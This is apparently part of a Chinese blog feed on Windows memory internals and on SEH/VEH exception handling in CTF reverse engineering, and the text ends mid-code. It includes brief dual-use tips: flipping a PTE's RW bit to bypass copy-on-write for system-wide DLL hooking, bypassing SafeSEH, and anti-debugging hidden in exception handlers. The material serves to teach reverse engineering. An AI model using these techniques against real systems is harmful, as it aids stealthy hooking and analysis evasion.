title="镜像文件"></a>镜像文件</h3><p>说白了就是LoadLibrary</p><p>用LoadLibrary加载的都会有写拷贝属性，这样就不会因为修改而影响到其他文件</p><h4 id="写拷贝"><a href="#写拷贝" class="headerlink" title="写拷贝"></a>写拷贝</h4><p>像一般dll都是多进程共享一个物理页面，如果其中一个进程hook了dll，所有进程都会被影响，所以需要写拷贝</p><p><img src="image-20200905120631895.png" alt="image-20200905120631895"></p><p>绕过写拷贝只需要把pte的rw位置1，这样就不会触发异常</p><h1 id="物理内存管理"><a href="#物理内存管理" class="headerlink" title="物理内存管理"></a>物理内存管理</h1><p>因为windows操作系统的限制，xp只能支持4gb内存，即使是29912分页</p><p><img src="image-20200905121508613.png" alt="image-20200905121508613"></p><p>但是服务器版本就没有限制可以识别到64gb</p><p>每个物理页都对应一个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">nt!_MMPFN<br>   +<span class="hljs-number">0x000</span> u1               : __unnamed<br>   +<span class="hljs-number">0x004</span> PteAddress       : Ptr32 _MMPTE<br>   +<span class="hljs-number">0x008</span> u2               : __unnamed<br>   +<span class="hljs-number">0x00c</span> u3               : __unnamed<br>   +<span class="hljs-number">0x010</span> OriginalPte      : _MMPTE<br>   +<span class="hljs-number">0x018</span> u4               : __unnamed<br></code></pre></td></tr></table></figure><p>3、物理页状态<br>0：MmZeroedPageListHead        零化链表（是系统在空闲的时候进行零化的，不是程序自己清零的那种）<br>1：MmFreePageListHead        空闲链表（物理页是周转使用的，刚被释放的物理页是没有清0，系统空闲的时候有专门的线程从这个队列摘取物理页，加以清0后再挂入MmZeroedPageListHead）<br>2：MmStandbyPageListHead        备用链表（当系统内存不够的时候，操作系统会把物理内存中的数据交换到硬盘上，此时页面不是直接挂到空闲链表上去，而是挂到备用链表上，虽然我释放了，但里边的内容还是有意义的）<br>3：MmModifiedPageListHead<br>4：MmModifiedNoWritePageListHead<br>5：MmBadPageListHead            坏链</p><p><img src="image-20200905121712705.png" alt="image-20200905121712705"></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Exception Handling in CTF</title>
    <link href="/2020/08/26/Exception-Handling-in-CTF/"/>
    <url>/2020/08/26/Exception-Handling-in-CTF/</url>
    
    <content type="html"><![CDATA[<p>简单说一下异常处理在ctf中是如何体现的</p><a id="more"></a><h1 id="SEH-VEH"><a href="#SEH-VEH" class="headerlink" title="SEH VEH"></a>SEH VEH</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">PVOID</span><span class="hljs-params">(NTAPI* FnAddVectoredExceptionHandler)</span><span class="hljs-params">(ULONG, _EXCEPTION_POINTERS*)</span></span>;<br>FnAddVectoredExceptionHandler MyAddVectoredExceptionHandler;<br><br><span class="hljs-function">LONG NTAPI <span class="hljs-title">VectExcepHandler</span><span class="hljs-params">(PEXCEPTION_POINTERS pExcepInfo)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (pExcepInfo-&gt;ExceptionRecord-&gt;ExceptionCode == <span class="hljs-number">0xC0000094</span>)<span class="hljs-comment">//除0异常</span><br>&#123;<br><span class="hljs-comment">//将除数修改为2</span><br>pExcepInfo-&gt;ContextRecord-&gt;Ecx = <span class="hljs-number">2</span>;<br><span class="hljs-comment">//或者修改发生异常的代码的Eip    idiv ecx长度2字节 从下一行开始执行</span><br><span class="hljs-comment">//pExcepInfo-&gt;ContextRecord-&gt;Eip = pExcepInfo-&gt;ContextRecord-&gt;Eip + 2;</span><br><span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;<span class="hljs-comment">//已处理</span><br>&#125;<br><span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_SEARCH;<span class="hljs-comment">//未处理</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>HMODULE hModule = GetModuleHandle(<span class="hljs-string">L&quot;Kernel32.dll&quot;</span>);<br>MyAddVectoredExceptionHandler = (FnAddVectoredExceptionHandler)::GetProcAddress(hModule, <span class="hljs-string">&quot;AddVectoredExceptionHandler&quot;</span>);<br><span class="hljs-comment">//参数1表示插入VEH链的头部, 0插入到VEH链的尾部</span><br>MyAddVectoredExceptionHandler(<span class="hljs-number">0</span>, (_EXCEPTION_POINTERS*)&amp;VectExcepHandler);<br><span class="hljs-comment">//构造除0异常</span><br><span class="hljs-keyword">int</span> val = <span class="hljs-number">0</span>;<br>_asm<br>&#123;<br><span class="hljs-keyword">xor</span> edx, edx<br><span class="hljs-keyword">xor</span> ecx, ecx<br>mov eax, <span class="hljs-number">100</span><br>idiv ecx<br>mov val, eax<span class="hljs-comment">//结果在eax</span><br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;val = %d\n&quot;</span>, val);<br>getchar();<br>&#125;<br></code></pre></td></tr></table></figure><p>上面是VEH</p><p><img src="image-20200826144944366.png" alt="image-20200826144944366"></p><p>主要是除0后调试器不会自动跟进异常处理函数中会直接跑起来</p><p>出题人往往在异常处理函数中写一些反调试</p><p>例题如SCTF2019某道逆向，一个AES，异常处理函数中判断是否调试然后改变密文</p><p>但那题是SEH不是VEH，总体形式很像</p><p>写起来不难，在异常处理函数中下断点就行，下面来介绍如何找到异常处理函数，要学会逆向首先得知道正向如何写</p><h2 id="手动挂入SEH"><a href="#手动挂入SEH" class="headerlink" title="手动挂入SEH"></a>手动挂入SEH</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION</span>* <span class="hljs-title">Next</span>;</span><br>DWORD Handler;<br>&#125;;<br><br>EXCEPTION_DISPOSITION _cdecl MyEexception_handler<br>(<br>_In_ struct _EXCEPTION_RECORD* _ExceptionRecord,<span class="hljs-comment">//异常结构体</span><br>_In_ <span class="hljs-keyword">void</span>* _EstablisherFrame,<span class="hljs-comment">//SEH结构体地址</span><br>_Inout_ struct _CONTEXT* _ContextRecord,<span class="hljs-comment">//存储异常发生时的各种寄存器的值 栈位置等</span><br>_Inout_ <span class="hljs-keyword">void</span>* _DispatcherContext<br>)<br>&#123;<br><span class="hljs-keyword">if</span> (_ExceptionRecord-&gt;ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)<br>&#123;<br>_ContextRecord-&gt;Ecx = <span class="hljs-number">2</span>;<br><span class="hljs-keyword">return</span> ExceptionContinueExecution;<br>&#125;<br><br><span class="hljs-keyword">return</span> ExceptionContinueSearch;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD temp;<br>_EXCEPTION Exception;<span class="hljs-comment">//必须在当前线程的堆栈中</span><br><br><span class="hljs-comment">//fs[0]-&gt; Exception</span><br>_asm<br>&#123;<br>mov eax, fs: [<span class="hljs-number">0</span>]<br>mov temp, eax<br>lea ecx, Exception<br>mov fs : [<span class="hljs-number">0</span>] , ecx<br>&#125;<br><span class="hljs-comment">//为SEH成员赋值</span><br>Exception.Next = (_EXCEPTION*)temp;<br>Exception.Handler = (DWORD)&amp;MyEexception_handler;<br><br><span class="hljs-comment">//创建异常</span><br><span class="hljs-keyword">int</span> val = <span class="hljs-number">0</span>;<br>_asm<br>&#123;<br><span class="hljs-keyword">xor</span> edx, edx<br><span class="hljs-keyword">xor</span> ecx, ecx<br>mov eax, <span class="hljs-number">4</span><br>idiv ecx<br>mov val, eax<span class="hljs-comment">//结果在eax</span><br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;val = %d\n&quot;</span>, val);<br><span class="hljs-comment">//摘除刚插入的SEH</span><br>_asm<br>&#123;<br>mov eax, temp<br>mov fs : [<span class="hljs-number">0</span>] , eax<br>&#125;<br>getchar();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>上面就是手动挂seh代码，因为有safeseh保护vs2005以上版本都不能手动挂了，有绕过方式直接hook 系统seh处理函数即可。但这和本文讲的无关，关闭safeseh即可</p><p><img src="image-20200826151313656.png" alt="image-20200826151313656"></p><p><img src="image-20200826151353283.png" alt="image-20200826151353283"></p><p><img src="image-20200826151459554.png" alt="image-20200826151459554"></p><p>总的来说是要关注对fs:0的操作，seh挂入就是通过挂入fs:0，然后将Exception.Next改为原始fs:0指向</p><p>一般出题是的异常处理都不是像上面一样手动挂的，都是利用编译器支持的SEH</p><p>也就是try except</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">_try                               <span class="hljs-number">1</span>) 挂入链表<br>&#123;<br>       <br>&#125;<br>_except(过滤表达式)       <span class="hljs-number">2</span>) 异常过滤<br>&#123;<br>       异常处理程序            <span class="hljs-number">3</span>) 异常处理程序<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="编译器扩展SEH"><a href="#编译器扩展SEH" class="headerlink" title="编译器扩展SEH"></a>编译器扩展SEH</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> val = <span class="hljs-number">0</span>;<br>__try<br>&#123;<br>_asm<br>&#123;<br><span class="hljs-keyword">xor</span> edx, edx<br><span class="hljs-keyword">xor</span> ecx, ecx<br>mov eax, <span class="hljs-number">100</span><br>idiv ecx<br>mov val, eax<span class="hljs-comment">//结果在eax</span><br>&#125;<br>&#125;<br>_except(GetExceptionCode() == <span class="hljs-number">0xC0000094</span> ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Exception Handling in CTF\n&quot;</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;val = %d\n&quot;</span>, val);<br>getchar();<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="image-20200826153328810.png" alt="image-20200826153328810"></p><p>这种在ctf中就比较常见了</p><p>当然还能换个形式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">ExceptFilter</span><span class="hljs-params">(LPEXCEPTION_POINTERS pExceptionInfo)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)<br>&#123;<br>pExceptionInfo-&gt;ContextRecord-&gt;Ecx = <span class="hljs-number">2</span>;<br><span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;<br>&#125;<br><span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_SEARCH;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> val;<br>_try<br>&#123;<br>_asm<br>&#123;<br><span class="hljs-keyword">xor</span> edx,edx<br><span class="hljs-keyword">xor</span> ecx,ecx<br>mov eax,<span class="hljs-number">100</span><br>idiv ecx<br>mov val,eax<br>&#125;<br>&#125;<span class="hljs-comment">//GetExceptionInformation获取异常结构指针</span><br>_except(ExceptFilter(GetExceptionInformation()))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Exception-Handling-in-CTF\n&quot;</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;val = %d\n&quot;</span>, val);<br>getchar();<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><img src="image-20200826153355707.png" alt="image-20200826153355707"></p><p>注意上面这段代码，下面来介绍下这段代码具体干了些啥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="hljs-title">Next</span>;</span><br>        PEXCEPTION_ROUTINE Handler;<br>    &#125; EXCEPTION_REGISTRATION_RECORD;<br></code></pre></td></tr></table></figure><p>每写一个try except，编译器会自动帮我们挂入一个_EXCEPTION_REGISTRATION_RECORD结构体，写一个还行，如果写多个嵌套try except，那就得挂多个结构体，很占空间，所以就有了拓展 _EXCEPTION_REGISTRATION_RECORD结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION</span>&#123;</span><br>       <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION</span> *<span class="hljs-title">prev</span>;</span><br>       <span class="hljs-keyword">void</span> (*handler)(PEXCEPTION_RECORD, PEXCEPTION_REGISTRATION, PCONTEXT, PEXCEPTION_RECORD);<br>       <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">scopetable_entry</span> *<span class="hljs-title">scopetable</span>;</span><br>       <span class="hljs-keyword">int</span> trylevel;<br>       <span class="hljs-keyword">int</span> _ebp;<br>   &#125;; <br></code></pre></td></tr></table></figure><p><img src="image-20200826160415927.png" alt="image-20200826160415927"></p><p><img src="image-20200826160901647.png" alt="image-20200826160901647"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">scopetable_entry</span></span><br><span class="hljs-class">&#123;</span><br>       DWORDpreviousTryLevel<span class="hljs-comment">//上一个try&#123;&#125;结构编号 </span><br>       PDWRD        lpfnFilter       <span class="hljs-comment">//过滤函数的起始地址</span><br>       PDWRD        lpfnHandler  <span class="hljs-comment">//异常处理程序的地址    </span><br>&#125;<br></code></pre></td></tr></table></figure><p>在ida中查看</p><p><img src="image-20200826161117320.png" alt="image-20200826161117320"></p><p>loc_9D108A</p><p><img src="image-20200826161205821.png" alt="image-20200826161205821"></p><p>即是过滤函数</p><p><img src="image-20200826161223519.png" alt="image-20200826161223519"></p><p>loc_9D10C1就是except中的代码了</p><p><img src="image-20200826161244822.png" alt="image-20200826161244822"></p><p>写一个try可能看不出有啥用，嵌套几个即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">ExceptFilter</span><span class="hljs-params">(LPEXCEPTION_POINTERS pExceptionInfo)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)<br>&#123;<br>pExceptionInfo-&gt;ContextRecord-&gt;Ecx = <span class="hljs-number">2</span>;<br><span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;<br>&#125;<br><span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_SEARCH;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> val;<br>_try<br>&#123;<br>_asm<br>&#123;<br><span class="hljs-keyword">xor</span> edx,edx<br><span class="hljs-keyword">xor</span> ecx,ecx<br>mov eax,<span class="hljs-number">100</span><br>idiv ecx<br>mov val,eax<br>&#125;<br>_try<br>&#123;<br>_asm<br>&#123;<br><span class="hljs-keyword">xor</span> edx,edx<br><span class="hljs-keyword">xor</span> ecx,ecx<br>mov eax,<span class="hljs-number">50</span><br>idiv ecx<br>mov val,eax<br>&#125;<br>_try<br>&#123;<br>_asm<br>&#123;<br><span class="hljs-keyword">xor</span> edx,edx<br><span class="hljs-keyword">xor</span> ecx,ecx<br>mov eax,<span class="hljs-number">10</span><br>idiv ecx<br>mov val,eax<br>&#125;<br>&#125;<span class="hljs-comment">//GetExceptionInformation获取异常结构指针</span><br>_except(ExceptFilter(GetExceptionInformation()))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Exception-Handling-in-CTF\n&quot;</span>);<br>&#125;<br>&#125;<span class="hljs-comment">//GetExceptionInformation获取异常结构指针</span><br>_except(ExceptFilter(GetExceptionInformation()))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Exception-Handling-in-CTF\n&quot;</span>);<br>&#125;<br>&#125;<span class="hljs-comment">//GetExceptionInformation获取异常结构指针</span><br>_except(ExceptFilter(GetExceptionInformation()))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Exception-Handling-in-CTF\n&quot;</span>);<br>&#125;<br>_try<br>&#123;<br>_asm<br>&#123;<br><span class="hljs-keyword">xor</span> edx, edx<br><span class="hljs-keyword">xor</span> ecx, ecx<br>mov eax, <span class="hljs-number">10</span><br>idiv ecx<br>mov val, eax<br>&#125;<br>&#125;<span class="hljs-comment">//GetExceptionInformation获取异常结构指针</span><br>_except(ExceptFilter(GetExceptionInformation()))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Exception-Handling-in-CTF\n&quot;</span>);<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;val = %d\n&quot;</span>, val);<br>getchar();<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><img src="image-20200826162439938.png" alt="image-20200826162439938"></p><p>在进入不同异常处理时都会赋值不同try level</p><p><img src="image-20200826162057326.png" alt="image-20200826162057326"></p><p>操作系统根据根据trylevel 选择scopetable数组然后调用scopetable数组中对应的lpfnFilter函数，如果lpfnFilter函数返回0  向上遍历 直到previousTryLevel=-1。</p><h2 id="未处理异常"><a href="#未处理异常" class="headerlink" title="未处理异常"></a>未处理异常</h2><p>这种在ctf出现的话就比上面稍微难一些</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">long</span> _stdcall 